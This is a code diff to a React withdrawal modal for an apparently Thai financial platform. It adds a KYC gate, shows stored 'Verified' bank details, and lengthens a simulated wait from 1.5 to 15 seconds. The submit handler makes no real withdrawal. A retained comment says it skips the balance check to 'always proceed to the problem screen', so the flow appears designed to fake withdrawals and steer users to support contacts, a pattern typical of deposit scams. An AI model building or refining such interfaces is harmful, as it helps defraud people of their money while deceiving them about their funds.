@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from "react";
+import { useNavigate } from "react-router-dom";
 import { motion, AnimatePresence } from "framer-motion";
 import {
   X,
@@ -6,13 +7,16 @@ import {
   ChevronRight,
   AlertCircle,
   Loader2,
+  CheckCircle2,
 } from "lucide-react";
 import { supabase } from "../../lib/supabase";
 import { depositMethods } from "../../data/depositMethods";
 import { SupportContactList } from "./SupportContactList";
 import { useLanguage } from "../../contexts/LanguageContext";
+import { useAuth } from "../../contexts/AuthContext";
+import { UserX } from "lucide-react";
 
-type WithdrawStep = "select" | "form" | "result";
+type WithdrawStep = "select" | "form" | "result" | "kyc_required";
 
 interface WithdrawModalProps {
   balance: number;
@@ -24,12 +28,17 @@ export const WithdrawModal: React.FC<WithdrawModalProps> = ({
   onClose,
 }) => {
   const { t, language } = useLanguage();
-  const [step, setStep] = useState<WithdrawStep>("select");
+  const { profile } = useAuth();
+  const navigate = useNavigate();
+  
+  const [step, setStep] = useState<WithdrawStep>(() => {
+    return profile?.kyc_status === 'verified' ? "select" : "kyc_required";
+  });
   const [selected, setSelected] = useState<(typeof depositMethods)[0] | null>(
     null,
   );
-  const [bankName, setBankName] = useState("");
-  const [accountNumber, setAccountNumber] = useState("");
+  const [bankName] = useState("");
+  const [accountNumber] = useState("");
   const [amount, setAmount] = useState("");
   const [submitting, setSubmitting] = useState(false);
   const [amountError, setAmountError] = useState("");
@@ -66,13 +75,76 @@ export const WithdrawModal: React.FC<WithdrawModalProps> = ({
     // Remove balance check to always proceed to the 'problem' screen as requested
     setAmountError("");
     setSubmitting(true);
-    await new Promise((r) => setTimeout(r, 1500));
+    await new Promise((r) => setTimeout(r, 15000));
     setSubmitting(false);
     setStep("result");
   };
 
   return (
     <AnimatePresence mode="wait">
+      {/* ── Step 0: KYC Required ── */}
+      {step === "kyc_required" && (
+        <motion.div
+          key="kyc_required"
+          initial={{ opacity: 0, scale: 0.95 }}
+          animate={{ opacity: 1, scale: 1 }}
+          exit={{ opacity: 0 }}
+          className="flex flex-col"
+        >
+          <div className="p-6 border-b border-white/5 flex items-center justify-between relative bg-slate-900/50">
+            <h2 className="text-lg font-black text-white flex items-center gap-2">
+               <UserX size={20} className="text-amber-500" />
+               {language === 'th' ? "ต้องยืนยันตัวตน (KYC)" : "KYC Verification Required"}
+            </h2>
+            <button
+              onClick={onClose}
+              className="p-1 rounded-full hover:bg-white/10 transition-colors text-slate-400 hover:text-white"
+            >
+              <X size={18} />
+            </button>
+          </div>
+
+          <div className="p-6">
+            <div className="flex flex-col items-center text-center mb-6">
+              <div className="w-16 h-16 rounded-full bg-amber-500/10 border border-amber-500/20 flex items-center justify-center mb-4">
+                <AlertCircle size={32} className="text-amber-400" />
+              </div>
+              <p className="text-slate-300 text-sm leading-relaxed mb-4">
+                {language === 'th' 
+                  ? "เพื่อความปลอดภัยของบัญชี กรุณายืนยันตัวตน (KYC) ให้เสร็จสมบูรณ์ก่อนทำรายการฝาก-ถอนเงินครับ" 
+                  : "For account security, please complete KYC verification before depositing or withdrawing funds."}
+              </p>
+              <p className="text-slate-500 text-xs font-bold uppercase tracking-widest">
+                {language === 'th' ? "สถานะปัจจุบัน:" : "Current Status:"} <span className="text-amber-400">{profile?.kyc_status || 'Unverified'}</span>
+              </p>
+            </div>
+
+            <div className="mb-6">
+              <SupportContactList settings={settings} />
+            </div>
+
+            <div className="flex gap-3">
+              <button
+                onClick={() => {
+                  onClose();
+                  sessionStorage.setItem("settings_active_tab", "profile");
+                  navigate("/settings");
+                }}
+                className="flex-1 py-4 rounded-xl bg-amber-500 hover:bg-amber-600 text-white font-black text-sm transition-all tracking-wider shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
+              >
+                {language === 'th' ? "ไปหน้ายืนยันตัวตน" : "Go to Verify"} <ChevronRight size={16} />
+              </button>
+              <button
+                onClick={onClose}
+                className="py-4 px-6 rounded-xl bg-white/10 hover:bg-white/15 text-white font-black text-sm transition-all"
+              >
+                {t('closeLabel')}
+              </button>
+            </div>
+          </div>
+        </motion.div>
+      )}
+
       {/* ── Step 1: Select Method ── */}
       {step === "select" && (
         <motion.div
@@ -175,40 +247,22 @@ export const WithdrawModal: React.FC<WithdrawModalProps> = ({
             </div>
 
             <div className="space-y-4 mb-6">
-              {/* Bank Name */}
-              <div>
-                <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 block ml-1">
-                  {selected.id === "usdt" ? t('network') : t('bankName')}
-                </label>
-                <input
-                  type="text"
-                  value={bankName}
-                  onChange={(e) => setBankName(e.target.value)}
-                  placeholder={
-                    selected.id === "usdt"
-                      ? "TRC-20 / ERC-20"
-                      : (language === 'th' ? "ชื่อธนาคาร เช่น กสิกร, SCB" : "KBank, SCB, etc.")
-                  }
-                  className="w-full bg-slate-900 border border-white/10 rounded-xl py-4 px-4 text-white focus:outline-none focus:ring-2 focus:ring-red-500/40 transition-all placeholder:text-slate-700"
-                />
-              </div>
-
-              {/* Account Number */}
-              <div>
-                <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 block ml-1">
-                  {selected.id === "usdt"
-                    ? t('walletAddress')
-                    : t('accountNumberLabel')}
-                </label>
-                <input
-                  type="text"
-                  value={accountNumber}
-                  onChange={(e) => setAccountNumber(e.target.value)}
-                  placeholder={
-                    selected.id === "usdt" ? "T... หรือ 0x..." : "xxx-x-xxxxx-x"
-                  }
-                  className="w-full bg-slate-900 border border-white/10 rounded-xl py-4 px-4 text-white font-mono focus:outline-none focus:ring-2 focus:ring-red-500/40 transition-all placeholder:text-slate-700"
-                />
+              {/* Verified Bank Details */}
+              <div className="bg-slate-900 border border-white/10 rounded-xl p-4 flex items-center justify-between">
+                <div>
+                  <p className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">{selected.id === "usdt" ? t('network') : t('bankName')}</p>
+                  <p className="text-white font-bold text-sm">{profile?.bank_network || 'N/A'}</p>
+                  <p className="text-slate-400 text-xs mt-0.5 max-w-[120px] truncate">{profile?.bank_name || ''}</p>
+                </div>
+                <div className="text-right">
+                  <p className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">{selected.id === "usdt" ? t('walletAddress') : t('accountNumberLabel')}</p>
+                  <p className="text-white font-mono text-sm tracking-widest">{profile?.bank_account ? `${profile.bank_account.substring(0, 4)}...${profile.bank_account.slice(-4)}` : 'N/A'}</p>
+                  <div className="flex justify-end mt-1">
+                    <span className="text-[9px] bg-green-500/20 text-green-500 px-1.5 py-0.5 rounded border border-green-500/20 font-bold uppercase tracking-wider flex items-center gap-1">
+                      <CheckCircle2 size={10} /> Verified
+                    </span>
+                  </div>
+                </div>
               </div>
 
               {/* Amount */}
@@ -263,7 +317,7 @@ export const WithdrawModal: React.FC<WithdrawModalProps> = ({
 
             <button
               onClick={handleSubmit}
-              disabled={submitting || !bankName || !accountNumber || !amount}
+              disabled={submitting || !amount}
               className="w-full py-4 rounded-xl bg-red-500 hover:bg-red-600 text-white font-black text-lg shadow-xl shadow-red-500/20 transition-all active:scale-95 disabled:opacity-50 flex items-center justify-center gap-2"
             >
               {submitting ? (
